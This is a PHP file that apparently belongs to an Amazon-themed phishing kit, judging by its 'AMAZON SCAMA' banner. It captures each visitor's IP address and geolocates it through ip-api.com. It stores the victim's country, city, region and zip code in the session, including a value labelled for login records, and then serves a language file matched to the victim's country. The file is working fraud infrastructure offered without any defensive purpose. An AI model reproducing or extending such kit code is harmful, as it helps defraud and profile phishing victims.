<?php
/* 
 _____  ________  ___ _____ _____ _   _ _____ _   _ _____    ___  ___  ___  ___   ___________ _   _   _____ _____   ___  ___  ___  ___  
/  ___||  _  |  \/  ||  ___|_   _| | | |_   _| \ | |  __ \  / _ \ |  \/  | / _ \ |___  /  _  | \ | | /  ___/  __ \ / _ \ |  \/  | / _ \ 
\ `--. | | | | .  . || |__   | | | |_| | | | |  \| | |  \/ / /_\ \| .  . |/ /_\ \   / /| | | |  \| | \ `--.| /  \// /_\ \| .  . |/ /_\ \
 `--. \| | | | |\/| ||  __|  | | |  _  | | | | . ` | | __  |  _  || |\/| ||  _  |  / / | | | | . ` |  `--. \ |    |  _  || |\/| ||  _  |
/\__/ /\ \_/ / |  | || |___  | | | | | |_| |_| |\  | |_\ \ | | | || |  | || | | |./ /__\ \_/ / |\  | /\__/ / \__/\| | | || |  | || | | |
\____/  \___/\_|  |_/\____/  \_/ \_| |_/\___/\_| \_/\____/ \_| |_/\_|  |_/\_| |_/\_____/\___/\_| \_/ \____/ \____/\_| |_/\_|  |_/\_| |_/
                                                                                                                                        
                                                                                                                                        
*/
session_start();
error_reporting(0);
$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
$result  = "Unknown";
if(filter_var($client, FILTER_VALIDATE_IP)){
    $ip = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP)){
    $_SESSION['_ip_'] = $ip = $forward;
}
else{
    $_SESSION['_ip_'] = $ip = $remote;
}
$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$_SESSION['_ip_']));
$LOOKUP_COUNTRY  = $IP_LOOKUP->country;
$LOOKUP_MINCODE  = $IP_LOOKUP->countryCode;
$LOOKUP_CITY     = $IP_LOOKUP->city;
$LOOKUP_REGION   = $IP_LOOKUP->region;
$LOOKUP_STATE    = $IP_LOOKUP->regionName;
$LOOKUP_ZIPCODE  = $IP_LOOKUP->zip;
$LOOKUP_LOWCODE  = strtolower($LOOKUP_MINCODE);
$_SESSION['_LOOKUP_COUNTRY_'] = $LOOKUP_COUNTRY;
$_SESSION['_LOOKUP_CNTRCODE_']= $LOOKUP_MINCODE;
$_SESSION['_LOOKUP_CNTRCODELOW_']= $LOOKUP_LOWCODE;
$_SESSION['_LOOKUP_CITY_']    = $LOOKUP_CITY;
$_SESSION['_LOOKUP_REGION_']  = $LOOKUP_REGION;
$_SESSION['_LOOKUP_STATE_']   = $LOOKUP_STATE;
$_SESSION['_LOOKUP_ZIPCODE_'] = $LOOKUP_ZIPCODE;
$_SESSION['_LOOKUP_REGIONS_'] = $_SESSION['_LOOKUP_STATE_']."(".$_SESSION['_LOOKUP_REGION_'].")";
$_SESSION['_forlogin_'] = $LOOKUP_MINCODE." - ".$_SESSION['_ip_'];
#Spanyol
$some_es = 	array("Mexico",
		      "Colombia",
		      "Spain",
		      "Argentina",
		      "Peru",
		      "Venezuela",
		      "Chile",
		      "Ecuador",
		      "Guatemala",
		      "Cuba",
		      "Bolivia",
		      "Dominican Republic",
		      "Honduras",
		      "Paraguay",
		      "El Salvador",
		      "Nicaragua",
		      "Costa Rica",
		      "Puerto Rico",
		      "Panama",
		      "Uruguay",
		      "Equatorial Guinea");
#Japan
$some_jp =	array("Japan",);
#China
$some_ch =	array("China",);
#Germany
$some_de = 	array("Germany",
			  "Austria",
			  "Switzerland",
			  "Liechtenstein");
if (in_array($LOOKUP_COUNTRY, $some_es)) {
    require "lang/es.php";
}elseif(in_array($LOOKUP_COUNTRY, $some_jp)){
	require "lang/jp.php";
}elseif(in_array($LOOKUP_COUNTRY, $some_ch)){
	require "lang/ch.php";
}elseif(in_array($LOOKUP_COUNTRY, $some_de)){
	require "lang/de.php";
}else{
	require "lang/en.php";
}
?>